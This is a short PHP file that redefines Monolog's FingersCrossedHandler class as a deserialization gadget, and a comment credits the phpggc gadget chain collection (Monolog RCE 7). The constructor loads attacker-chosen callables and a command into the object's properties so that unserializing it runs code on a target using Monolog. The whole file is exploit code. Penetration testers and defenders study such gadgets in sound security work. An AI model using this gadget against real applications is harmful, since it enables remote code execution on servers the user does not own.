<?php

// This gadget is publicly available at:
// https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/7/gadgets.php

namespace Monolog\Handler {
    class FingersCrossedHandler
    {
        protected $passthruLevel = 0;
        protected $handler;
        protected $buffer;
        protected $processors;

        function __construct($methods, $command)
        {
            $this->processors = $methods;
            $this->buffer = [$command];
            $this->handler = $this;
        }
    }
}